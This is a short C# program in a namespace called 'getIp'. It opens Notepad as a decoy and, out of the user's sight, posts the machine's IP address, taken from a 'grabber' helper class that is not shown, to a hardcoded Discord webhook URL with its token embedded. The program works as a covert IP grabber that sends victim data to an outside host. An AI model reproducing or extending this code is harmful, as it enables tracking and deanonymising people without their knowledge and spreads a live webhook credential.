using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace getIp
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Process p = null;
            try
            {
                p = new Process();
                p.StartInfo.FileName = "notepad";
                p.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception Occurred :{0},{1}",
                         ex.Message, ex.StackTrace.ToString());
            }

            string webhook = "https://discord.com/api/webhooks/969253375826866186/PJAjmwHVn3fDZFBLBCc9g2vQep4rux3CLgw9VqKYknpwp848wsiTBqIkyf5ctVj7lZQs";

            var wbc = new WebClient();
            var data = new NameValueCollection();
            data["content"] = grabber.GetIp();
            wbc.UploadValues(webhook, data);

            

        }
    }
}
